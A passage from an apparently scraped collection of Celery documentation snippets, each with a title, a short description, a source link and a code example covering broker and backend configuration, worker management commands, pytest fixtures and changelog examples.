for Redis. This example sets the backend to Redis running on localhost, using database 1. This is typically done in a Celery configuration file or object (e.g., `celeryconfig.py`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_24\n\nLANGUAGE: python\nCODE:\n```\nCELERY_RESULT_BACKEND = 'redis://localhost/1'\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Channel Prefix\nDESCRIPTION: Setting to enable channel prefixing for Redis broadcast messages to separate virtual hosts\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nBROKER_TRANSPORT_OPTIONS = {'fanout_prefix': True}\n```\n\n----------------------------------------\n\nTITLE: Restarting Celery Worker using HUP Signal (Console)\nDESCRIPTION: Shows how to restart a Celery worker by sending the SIGHUP signal using the `kill` command. This method requires the worker's process ID (`$pid`) and relies on the worker to restart itself. It's noted as potentially problematic and not recommended for production. This method only works for background daemonized workers and is disabled on macOS.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_8\n\nLANGUAGE: console\nCODE:\n```\n$ kill -HUP $pid\n```\n\n----------------------------------------\n\nTITLE: Force Killing Multiple Celery Workers\nDESCRIPTION: Demonstrates how to forcefully terminate multiple Celery workers. Warning included as this will discard executing tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_15\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi kill jerry elaine george kramer\n```\n\n----------------------------------------\n\nTITLE: Starting a Celery Worker in Python\nDESCRIPTION: Shows how to start a Celery worker with a specified log level.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/app-overview.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nworker = celery.Worker(loglevel='INFO')\n```\n\n----------------------------------------\n\nTITLE: Setting the Broker Heartbeat Interval - Python\nDESCRIPTION: This code snippet sets the 'BROKER_HEARTBEAT' parameter in a Python configuration file to control the interval between AMQP heartbeat packets for Celery's broker connection. Adjusting this value affects the interval Celery monitors heartbeats from the broker, with the default being 10 seconds. Users can modify this interval to match their broker's configuration and network characteristics. The configuration must be set before starting the Celery worker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nBROKER_HEARTBEAT = 5.0\n```\n\n----------------------------------------\n\nTITLE: Starting Flower on a Specific Port\nDESCRIPTION: Starts the Flower web server for the Celery application `proj`, but specifies a custom port (5555) using the `--port` argument.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_22\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj flower --port=5555\n```\n\n----------------------------------------\n\nTITLE: Declaring msgpack Dependency in Requirements File - Python\nDESCRIPTION: This snippet declares the 'msgpack' library as a required dependency for the Celery project, specifying that version 1.1.0 must be installed. This is written in the standard pip requirements.txt format, which is recognized by Python tooling like pip for automated environment setup. No parameters are included; the requirement is explicit and constraints compatibility to the given version, ensuring consistent behavior across environments.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/msgpack.txt#2025-04-23_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\nmsgpack==1.1.0\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Worker via Django manage.py (Console)\nDESCRIPTION: Command-line example showing how to start the Celery worker daemon using Django's `manage.py` script, a feature added in Celery 0.3.0.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_19\n\nLANGUAGE: console\nCODE:\n```\n$ python manage.py celeryd\n```\n\n----------------------------------------\n\nTITLE: Including Additional Modules for Embedded Workers via celery_includes Fixture\nDESCRIPTION: Demonstrates how to use the `celery_includes` fixture to specify a list of modules that should be automatically imported when the embedded test worker starts. This is useful for ensuring task modules or signal handlers are loaded.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\n@pytest.fixture(scope='session')\ndef celery_includes():\n    return [\n        'proj.tests.tasks',\n        'proj.tests.celery_signal_handlers',\n    ]\n```\n\n----------------------------------------\n\nTITLE: Defining Session-Scoped Celery Configuration via Pytest Fixture\nDESCRIPTION: Shows how to define a session-scoped pytest fixture named `celery_config` (typically in `conftest.py`). This fixture returns a dictionary containing default Celery configuration settings (`broker_url`, `result_backend`) that will be applied to the test Celery app throughout the test session.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n# Put this in your conftest.py\n@pytest.fixture(scope='session')\ndef celery_config():\n    return {\n        'broker_url': 'amqp://',\n        'result_backend': 'redis://'\n    }\n```\n\n----------------------------------------\n\nTITLE: Connecting Worker Before Create Process Signal in Python\nDESCRIPTION: Example of connecting to the new worker_before_create_process signal in Celery 5.3, which is dispatched in the parent process before a new child process is created in the prefork pool. This can be used to clean up instances that don't behave well when forking.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-5.3.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n@signals.worker_before_create_process.connect\ndef clean_channels(**kwargs):\n    grpc_singleton.clean_channel()\n```\n\n----------------------------------------\n\nTITLE: Manual Task Execution in Python Shell\nDESCRIPTION: Example of manually executing a Celery task from Python shell for debugging purposes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> from myapp.tasks import MyPeriodicTask\n>>> MyPeriodicTask.delay()\n```\n\n----------------------------------------\n\nTITLE: Running Django Migrations for django-celery-beat\nDESCRIPTION: Command to apply Django database migrations to create the necessary tables for django-celery-beat functionality.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_18\n\nLANGUAGE: console\nCODE:\n```\n$ python manage.py migrate\n```\n\n----------------------------------------\n\nTITLE: Customizing Task Failure Handler with Celery Annotations in Python\nDESCRIPTION: Demonstrates how to use CELERY_ANNOTATIONS to customize the on_failure handler for all tasks. This example defines a custom function that prints a message when a task fails.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-2.5.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\ndef my_on_failure(self, exc, task_id, args, kwargs, einfo):\n    print('Oh no! Task failed: %r' % (exc,))\n\nCELERY_ANNOTATIONS = {'*': {'on_failure': my_on_failure}}\n```\n\n----------------------------------------\n\nTITLE: Configuring CosmosDB Backend URL\nDESCRIPTION: Python configuration for CosmosDB backend connection URL\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_36\n\nLANGUAGE: python\nCODE:\n```\nresult_backend = 'cosmosdbsql://:{InsertAccountPrimaryKeyHere}@{InsertAccountNameHere}.documents.azure.com'\n```\n\n----------------------------------------\n\nTITLE: Configuring Pickle Serializer in Celery\nDESCRIPTION: Example configuration to maintain pickle as the serializer when upgrading to Celery 4.0\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\ntask_serializer = 'pickle'\nresult_serializer = 'pickle'\naccept_content = {'pickle'}\n```\n\n----------------------------------------\n\nTITLE: TaskPool Implementation\nDESCRIPTION: A modified version of multiprocessing.Pool that ensures worker processes are continuously running. Automatically replaces any terminated worker processes with new ones.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/worker.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom multiprocessing import Pool\n```\n\n----------------------------------------\n\nTITLE: Checking for systemd using systemctl\nDESCRIPTION: Demonstrates how to check if a Linux distribution uses systemd by running the `systemctl --version` command in the console. The output confirms the presence and version of systemd, guiding the user towards the appropriate daemonization documentation (systemd or generic init-scripts).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ systemctl --version\nsystemd 249 (v249.9-1.fc35)\n+PAM +AUDIT +SELINUX -APPARMOR +IMA +SMACK +SECCOMP +GCRYPT +GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 -IDN +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 +PWQUALITY +P11KIT +QRENCODE +BZIP2 +LZ4 +XZ +ZLIB +ZSTD +XKBCOMMON +UTMP +SYSVINIT default-hierarchy=unified\n```\n\n----------------------------------------\n\nTITLE: Adding Extension Commands to the Celery CLI via setuptools - Python\nDESCRIPTION: This setup.py snippet exemplifies how to add a custom entry-point for extension commands in the Celery CLI. By registering a module and a Command class under 'celery.commands', custom CLI commands can be easily integrated. The command class must implement the interface of 'celery.bin.base.Command'. This setup is used by libraries or applications that wish to extend Celery's command-line functionality.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\nsetup(\n    entry_points=[\n        'celery.commands': [\n            'foo = my.module:Command',\n        ],\n    ],\n    ...)\n```\n\n----------------------------------------\n\nTITLE: Anti-Pattern: Synchronous Subtask Execution in Celery\nDESCRIPTION: This code demonstrates an inefficient pattern of launching synchronous subtasks within a Celery task. This approach can lead to deadlocks if the worker pool is exhausted.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_43\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef update_page_info(url):\n    page = fetch_page.delay(url).get()\n    info = parse_page.delay(page).get()\n    store_page_info.delay(url, info)\n\n@app.task\ndef fetch_page(url):\n    return myhttplib.get(url)\n\n@app.task\ndef parse_page(page):\n    return myparser.parse_document(page)\n\n@app.task\ndef store_page_info(url, info):\n    return PageInfo.objects.create(url, info)\n```\n\n----------------------------------------\n\nTITLE: Setting Redis Visibility Timeout\nDESCRIPTION: Configuration for task visibility timeout in Redis broker\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/redis.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\napp.conf.broker_transport_options = {'visibility_timeout': 3600}  # 1 hour.\n```\n\n----------------------------------------\n\nTITLE: Declaring Django Dependency (Requirements)\nDESCRIPTION: This line specifies a dependency on the Django Python web framework, requiring version 2.2.28 or any later compatible version. This format is standard for Python package manager (pip) requirements files (`requirements.txt`).\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/django.txt#2025-04-23_snippet_0\n\nLANGUAGE: requirements\nCODE:\n```\nDjango>=2.2.28\n```\n\n----------------------------------------\n\nTITLE: CLI Command Format in Celery 5.0+\nDESCRIPTION: Demonstrates the new CLI implementation in Celery 5.0+ where global options must be positioned as options for the 'celery' command rather than after the sub-command.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-5.4.rst#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncelery --app path.to.app worker\n```\n\n----------------------------------------\n\nTITLE: Installing Celery Test Requirements (Console)\nDESCRIPTION: Shows the command to install dependencies required for running the Celery test suite using pip and a requirements file. This step is necessary before executing the unit tests.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_14\n\nLANGUAGE: console\nCODE:\n```\n$ pip install -r requirements/test.txt\n```\n\n----------------------------------------\n\nTITLE: Setting Celery App Initialization Parameters via celery_parameters Fixture\nDESCRIPTION: Demonstrates redefining the `celery_parameters` fixture to pass custom parameters directly to the `Celery` class constructor when creating the test app instance. This allows setting options like a custom task class (`task_cls`) or disabling strict typing.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\n@pytest.fixture(scope='session')\ndef celery_parameters():\n    return {\n        'task_cls':  my.package.MyCustomTaskClass,\n        'strict_typing': False,\n    }\n```\n\n----------------------------------------\n\nTITLE: Message Transport Comparison Table in RST\nDESCRIPTION: ReStructuredText table comparing different message transport options supported by Celery, including their status, monitoring capabilities, and remote control support.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/index.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n+---------------+--------------+----------------+--------------------+\n| **Name**      | **Status**   | **Monitoring** | **Remote Control** |\n+---------------+--------------+----------------+--------------------+\n| *RabbitMQ*    | Stable       | Yes            | Yes                |\n+---------------+--------------+----------------+--------------------+\n| *Redis*       | Stable       | Yes            | Yes                |\n+---------------+--------------+----------------+--------------------+\n| *Amazon SQS*  | Stable       | No             | No                 |\n+---------------+--------------+----------------+--------------------+\n| *Zookeeper*   | Experimental | No             | No                 |\n+---------------+--------------+----------------+--------------------+\n| *Kafka*       | Experimental | No             | No                 |\n+---------------+--------------+----------------+--------------------+\n| *GC PubSub*   | Experimental | Yes            | Yes                |\n+---------------+--------------+----------------+--------------------+\n```\n\n----------------------------------------\n\nTITLE: Executing Celery Tasks via Django Shell (Python)\nDESCRIPTION: Demonstrates how to run Celery tasks defined in `demoapp.tasks` using the Django management shell. It imports tasks (`add`, `mul`, `xsum`), queues the `add` task with arguments (2, 3) using `delay_on_commit` (which executes after the current database transaction commits, available in Celery >= 5.4 with Django), and then synchronously retrieves the result using `res.get()`. Requires a running worker and the Django environment initialized via `python ./manage.py shell`.\nSOURCE: https://github.com/celery/celery/blob/main/examples/django/README.rst#2025-04-23_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n$ python ./manage.py shell\n>>> from demoapp.tasks import add, mul, xsum\n>>> res = add.delay_on_commit(2, 3)\n>>> res.get()\n5\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Database Table Names in Celery\nDESCRIPTION: Example of using the database_table_names setting to customize the names of result metadata tables when using SQLAlchemy as the result backend.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\n# use custom table names for the database result backend.\ndatabase_table_names = {\n    'task': 'myapp_taskmeta',\n    'group': 'myapp_groupmeta',\n}\n```\n\n----------------------------------------\n\nTITLE: Using Chord Primitives in Celery (Python)\nDESCRIPTION: Shows how to use Celery's chord primitive to execute a group of tasks followed by a callback task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_11\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import chord\n>>> from proj.tasks import add, xsum\n\n>>> chord((add.s(i, i) for i in range(10)), xsum.s())().get()\n90\n\n>>> (group(add.s(i, i) for i in range(10)) | xsum.s())().get()\n90\n\n>>> upload_document.s(file) | group(apply_filter.s() for filter in filters)\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Worker Pool for Testing in Python\nDESCRIPTION: This fixture sets the worker pool to 'prefork' for the entire test session. It's important to note that gevent/eventlet pools cannot be used unless the entire test suite runs with monkeypatches enabled.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_14\n\nLANGUAGE: Python\nCODE:\n```\n@pytest.fixture(scope='session')\ndef celery_worker_pool():\n    return 'prefork'\n```\n\n----------------------------------------\n\nTITLE: Redis Transport Configuration Example\nDESCRIPTION: Configuration for Redis transport options to ensure backward compatibility\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nBROKER_TRANSPORT_OPTIONS = {\n    'fanout_patterns': True,\n    'fanout_prefix': True,\n}\n```\n\n----------------------------------------\n\nTITLE: Cloning Celery Subtasks with Modified Arguments\nDESCRIPTION: Interactive Python example showing how to clone an existing Celery subtask while augmenting its arguments and options. Creates a new subtask with modified args and countdown parameter.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.5.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> s = add.subtask((5,))\n>>> new = s.clone(args=(10,), countdown=5})\n>>> new.args\n(10, 5)\n\n>>> new.options\n{'countdown': 5}\n```\n\n----------------------------------------\n\nTITLE: Error Handler Task Registration Example\nDESCRIPTION: Demonstrates how to schedule error handlers that are not registered tasks in the current worker using Celery Signatures.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-4.3.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Signature\nSignature(\n  'bar', args=['foo'],\n  link_error=Signature('msg.err', queue='msg')\n).apply_async()\n```\n\n----------------------------------------\n\nTITLE: Displaying Celery Worker Help (Console)\nDESCRIPTION: Executes the Celery worker command with the `--help` option to display a list of all available command-line arguments and their descriptions. Useful for exploring configuration options.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ celery worker --help\n```\n\n----------------------------------------\n\nTITLE: Worker Active Tasks Dump Example\nDESCRIPTION: Example response from the dump_active command showing currently executing tasks with their details.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_2\n\nLANGUAGE: pycon\nCODE:\n```\n>>> broadcast('dump_active', arguments={'safe': False}, reply=True)\n[{'worker.local': [\n    {'args': '(1,)',\n     'time_start': 1278580542.6300001,\n     'name': 'tasks.sleeptask',\n     'delivery_info': {\n         'consumer_tag': '30',\n         'routing_key': 'celery',\n         'exchange': 'celery'},\n     'hostname': 'casper.local',\n     'acknowledged': True,\n     'kwargs': '{}',\n     'id': '802e93e9-e470-47ed-b913-06de8510aca2',\n    }\n]}]\n```\n\n----------------------------------------\n\nTITLE: Checking the Status of Online Celery Workers (console)\nDESCRIPTION: Executes `celery -A proj status` to query the cluster using remote control commands (ping) and display a list of currently online and responsive workers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_21\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj status\n```\n\n----------------------------------------\n\nTITLE: Configuring SQLAlchemy Engine Options\nDESCRIPTION: Example of setting additional SQLAlchemy database engine options through configuration.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\n# echo enables verbose logging from SQLAlchemy.\nCELERY_RESULT_ENGINE_OPTIONS = {'echo': True}\n```\n\n----------------------------------------\n\nTITLE: Restarting Multiple Celery Workers\nDESCRIPTION: Shows how to restart multiple Celery workers sequentially using celeryd-multi. Workers are restarted one at a time after old ones shut down.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_14\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi restart jerry elaine george kramer\n```\n\n----------------------------------------\n\nTITLE: Specifying Pydantic Dependency in requirements.txt (plaintext)\nDESCRIPTION: Specifies a minimum required version (2.4) of the Pydantic package needed for the project. This entry is used by package management tools like pip to automatically install the specified dependency. No additional parameters or configuration are present, and the file assumes standard pip-compatible syntax.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/pydantic.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\npydantic>=2.4\n```\n\n----------------------------------------\n\nTITLE: Interacting with the Remote PDB Session (Text)\nDESCRIPTION: This text snippet illustrates interacting with the remote debugging (PDB) session established via telnet. It shows commands to inspect the value of the `result` variable (`result`), modify its value (`result = 'hello from rdb'`), and then use the `continue` command to resume the task's execution. The connection is closed after continuing.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/debugging.rst#2025-04-23_snippet_3\n\nLANGUAGE: text\nCODE:\n```\n(Pdb) result\n4\n(Pdb) result = 'hello from rdb'\n(Pdb) continue\nConnection closed by foreign host.\n```\n\n----------------------------------------\n\nTITLE: Enabling Logging for Embedded Celery Workers via Fixture\nDESCRIPTION: Illustrates how to enable logging output from the embedded test worker by overriding the `celery_enable_logging` fixture. Returning `True` from this session-scoped fixture activates logging for the worker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\n@pytest.fixture(scope='session')\ndef celery_enable_logging():\n    return True\n```\n\n----------------------------------------\n\nTITLE: Redis Unix Socket with Virtual Host\nDESCRIPTION: URL format for Unix socket connection with database selection\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/redis.rst#2025-04-23_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nredis+socket:///path/to/redis.sock?virtual_host=db_number\n```\n\n----------------------------------------\n\nTITLE: Configuring Database Engine Options in Celery\nDESCRIPTION: Example of using the database_engine_options setting to enable verbose logging from SQLAlchemy.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\n# echo enables verbose logging from SQLAlchemy.\napp.conf.database_engine_options = {'echo': True}\n```\n\n----------------------------------------\n\nTITLE: Force Killing Celery Workers with ps/awk/xargs (Console)\nDESCRIPTION: Provides an alternative method to forcefully terminate Celery worker processes using standard Unix utilities. It lists processes (`ps`), filters for 'celery worker' (`awk`), extracts process IDs, and sends the SIGKILL signal (-9) using `xargs kill`. This achieves the same result as the `pkill` command but is more portable.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_4\n\nLANGUAGE: console\nCODE:\n```\n$ ps auxww | awk '/celery worker/ {print $2}' | xargs kill -9\n```\n\n----------------------------------------\n\nTITLE: Setting environment variable for debugging init scripts in Python\nDESCRIPTION: Sets the C_FAKEFORK environment variable to skip daemonization when starting Celery, allowing errors to be seen on stderr. This works with the celery multi command.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ C_FAKEFORK /etc/init.d/celeryd start\n```\n\n----------------------------------------\n\nTITLE: Running Celery Workers in Background\nDESCRIPTION: Commands for managing background Celery workers using celery multi.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_3\n\nLANGUAGE: console\nCODE:\n```\n$ celery multi start w1 -A proj -l INFO\n$ celery multi restart w1 -A proj -l INFO\n$ celery multi stop w1 -A proj -l INFO\n$ celery multi stopwait w1 -A proj -l INFO\n```\n\n----------------------------------------\n\nTITLE: Installing IronCache Backend Dependencies\nDESCRIPTION: Command to install the iron_celery package required for IronCache backend\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_31\n\nLANGUAGE: console\nCODE:\n```\n$ pip install iron_celery\n```\n\n----------------------------------------\n\nTITLE: Direct Task Execution with Subtasks\nDESCRIPTION: Example showing how subtask calls now execute tasks directly instead of using delay()\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef add(x, y):\n    return x + y\n\nadd.s(2, 2)()\n```\n\n----------------------------------------\n\nTITLE: Enabling Worker Heartbeats via celery_worker_parameters Fixture\nDESCRIPTION: Shows how to enable worker heartbeats (which are disabled by default in tests) by redefining the `celery_worker_parameters` fixture. Setting `without_heartbeat` to `False` in the returned dictionary enables heartbeat events (`worker-online`, `worker-offline`, `worker-heartbeat`) for the embedded test worker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n# Put this in your conftest.py\n@pytest.fixture(scope=\"session\")\ndef celery_worker_parameters():\n    return {\"without_heartbeat\": False}\n    ...\n```\n\n----------------------------------------\n\nTITLE: Configuring Worker Directory Structure\nDESCRIPTION: Commands to set up dedicated directories for Celery worker logs and pid files.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_4\n\nLANGUAGE: console\nCODE:\n```\n$ mkdir -p /var/run/celery\n$ mkdir -p /var/log/celery\n$ celery multi start w1 -A proj -l INFO --pidfile=/var/run/celery/%n.pid \\\n                                            --logfile=/var/log/celery/%n%I.log\n```\n\n----------------------------------------\n\nTITLE: Using app_or_default in Celery\nDESCRIPTION: Shows how to use the app_or_default function in Celery to maintain compatibility with the module-based API.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.app import app_or_default\n\nclass Scheduler:\n    def __init__(self, app=None):\n        self.app = app_or_default(app)\n```\n\n----------------------------------------\n\nTITLE: Monitoring Celery Events with Curses Interface (console)\nDESCRIPTION: Launches the text-based user interface (TUI) for monitoring Celery events using `celery -A proj events`. This provides a real-time, curses-based view of worker activity and task states, requiring events to be enabled first.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_19\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj events\n```\n\n----------------------------------------\n\nTITLE: Celery Worker Component Configuration\nDESCRIPTION: Default configuration settings for core Celery worker components including the task pool, mediator, scheduler and consumer implementations.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nCELERYD_POOL = 'celery.concurrency.processes.TaskPool'\nCELERYD_MEDIATOR = 'celery.worker.controllers.Mediator'\nCELERYD_ETA_SCHEDULER = 'celery.worker.controllers.ScheduleController'\nCELERYD_CONSUMER = 'celery.worker.consumer.Consumer'\n```\n\n----------------------------------------\n\nTITLE: Example Celery Task Definition for Automatic Naming in Python\nDESCRIPTION: Provides the Python code for a simple Celery task named `add` defined within a file named `tasks.py`. When decorated with `@app.task` without a `name` argument, Celery automatically generates the name 'tasks.add' based on the filename and function name.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents in reStructuredText for Celery Documentation\nDESCRIPTION: A reStructuredText directive that defines the table of contents for the Getting Started section of Celery documentation. It includes links to introduction pages, backend and broker information, first steps tutorials, next steps guides, and resource pages with a maximum depth of 2 levels.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/index.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. toctree::\n    :maxdepth: 2\n\n    introduction\n    backends-and-brokers/index\n    first-steps-with-celery\n    next-steps\n    resources\n```\n\n----------------------------------------\n\nTITLE: Invoking Celery Tasks via HTTP GET (Text/URL)\nDESCRIPTION: Shows the URL structure for triggering a Celery task via the `views.apply` view introduced in version 0.3.20. The example demonstrates passing positional and keyword arguments within the URL. Use with caution due to security implications.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_17\n\nLANGUAGE: text\nCODE:\n```\nhttp://e.com/celery/apply/task_name/arg1/arg2//?kwarg1=a&kwarg2=b\n```\n\n----------------------------------------\n\nTITLE: Logging Format Configuration in Celery\nDESCRIPTION: Default format string used for logging messages in Celery. Includes timestamp, log level, process name and message.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_51\n\nLANGUAGE: text\nCODE:\n```\n[%(asctime)s: %(levelname)s/%(processName)s] %(message)s\n```\n\n----------------------------------------\n\nTITLE: Installing Celery with Extensions\nDESCRIPTION: Command line example showing how to install Celery with additional dependencies using pip extras\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_10\n\nLANGUAGE: console\nCODE:\n```\n$ pip install celery[redis,mongodb]\n```\n\n----------------------------------------\n\nTITLE: Installing Flower using pip\nDESCRIPTION: Installs the Flower Celery monitoring tool using the Python package installer, pip. Requires pip to be installed in the environment.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_20\n\nLANGUAGE: console\nCODE:\n```\n$ pip install flower\n```\n\n----------------------------------------\n\nTITLE: Setting subtask ID with property access in Python\nDESCRIPTION: Example demonstrating how to set and access a subtask's ID using both the new property access method and the traditional dictionary access method. The subtask ID can be set using the '.id' property which maps to the task_id in the options dictionary.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n>>> s = add.s(2, 2)\n>>> s.id = 'my-id'\n>>> s['options']\n{'task_id': 'my-id'}\n\n>>> s.id\n'my-id'\n```\n\n----------------------------------------\n\nTITLE: Adding django_celery_beat to Django INSTALLED_APPS\nDESCRIPTION: Configuration snippet showing how to add the django_celery_beat module to the INSTALLED_APPS setting in Django's settings.py file.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\nINSTALLED_APPS = (\n    ...,\n    'django_celery_beat',\n)\n```\n\n----------------------------------------\n\nTITLE: Accessing Celery Configuration in Python\nDESCRIPTION: Demonstrates two ways to access and modify Celery configuration settings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/app-overview.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\ncelery.conf.task_always_eager = True\ncelery.conf['task_always_eager'] = True\n```\n\n----------------------------------------\n\nTITLE: Killing Celery Workers via Command Line\nDESCRIPTION: Commands to terminate Celery worker processes either gracefully or forcefully using pkill or 